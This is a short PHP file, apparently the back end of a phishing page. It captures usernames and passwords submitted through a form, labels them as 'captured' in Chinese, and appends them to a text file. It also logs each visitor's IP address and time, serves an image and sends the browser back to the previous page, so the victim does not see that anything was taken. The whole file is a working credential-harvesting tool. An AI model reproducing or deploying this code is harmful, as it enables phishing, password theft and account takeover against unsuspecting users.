<?php
$nam = stripslashes($_POST['user']);
$pas = stripslashes($_POST['pass']);
$content = "已捕获...."."账号:".$nam."密码:".$pas;
$filed = @fopen("mima.txt","a+");

@fwrite($filed, "$content\n");
$ip=$_SERVER['REMOTE_ADDR'];
date_default_timezone_set('PRC');
$a=date('Y.m.d;H:i:s');
$arr=['IP'=>$ip,'TIME'=>$a];
$jo=json_encode($arr,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
$url = 'yf.png';
$img = file_get_contents($url,true);
header("Content-Type: image/png;text/html; charset=utf-8");
echo $img;

$file=fopen('ip.txt','ab');
fwrite($file,$jo."\n");
fclose($file);
?>

<html>
<head>
<script type= "text/javascript">
function goBack()
{
window.history.back()//后退+刷新
}
</script>
</head>
<body onload="goBack()">  <!-- 加载之后立即执行一段JavaScript--->
</body>
</html>
